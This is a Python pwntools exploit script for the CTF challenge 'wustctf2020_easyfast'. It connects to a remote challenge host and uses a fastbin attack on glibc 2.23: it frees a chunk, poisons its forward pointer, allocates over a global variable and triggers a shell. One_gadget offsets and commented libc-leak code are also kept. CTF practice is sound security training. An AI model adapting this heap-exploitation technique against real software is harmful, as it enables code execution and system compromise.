import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='wustctf2020_easyfast'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28475)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a):
			io.sendlineafter('choice>','1')
			io.sendlineafter('size>',str(a))

		def delete(a):
			io.sendlineafter('choice>','2')
			io.sendlineafter('index>',str(a))

		def edit(a,c):
			io.sendlineafter('choice>','3')
			io.sendlineafter('index>',str(a))
			io.send(c)

		def get_shell():
			io.sendlineafter('choice>','4')

		add(0x68)
		delete(0)
		edit(0,p64(0x6020b0-3))
		add(0x68)
		add(0x68)
		edit(2,'\x00'*3+p64(0x602090)[:-3])
		edit(0,'\x00')
		get_shell()
		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue